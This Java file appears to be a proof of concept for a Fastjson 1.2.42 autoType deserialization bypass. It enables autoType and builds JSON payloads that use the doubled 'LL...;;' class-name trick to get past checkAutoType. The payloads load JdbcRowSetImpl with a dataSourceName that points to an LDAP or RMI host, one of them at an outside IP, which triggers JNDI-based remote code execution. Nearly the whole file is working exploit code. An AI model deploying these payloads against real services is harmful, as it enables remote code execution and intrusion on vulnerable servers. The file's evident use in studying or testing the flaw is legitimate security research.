import com.alibaba.fastjson.JSON;

import static basicdatasource.BasicDataSourcePoc.basicDataSource;

/**
 * Created by xjj on 2023/3/8.
 */
public class FastJson3_Eq1242 {
    static {
        System.setProperty("com.alibaba.fastjson.parser.ParserConfig.autoTypeSupport", "true");
    }

    public static String jdbcRowSetImpl() {
        /**
         * 和上一个逻辑一样
         * 只不过多了一层过滤判断首尾字符串, 并截掉
         * 只需要双写即可
         * checkAutoType() 的时候递归首尾去掉加载恶意代码
         */
        // poc 这块首尾加了L和;
//        String poc = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\", \"dataSourceName\":\"ldap://47.95.7.37:1389/Calc\", \"autoCommit\":true}";

        // 高版本测试
        String poc = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\", \"dataSourceName\":\"rmi://127.0.0.1:1099/Calc\", \"autoCommit\":true}";

        /**
         * 下面三种任选一种
         * JSON.parse(PoC);
         * JSON.parseObject(PoC);
         * JSONObject.parse(PoC);
         */
        return poc;
    }

    public static void main(String[] args) {
        System.out.println(JSON.VERSION);

        String poc = basicDataSource();
        /**
         * 这个里面有toJSON方法, 就是把已经构造好的类全部执行一遍其中的
         */
//        JSON.parseObject(poc);
        JSON.parse(poc);
    }
}
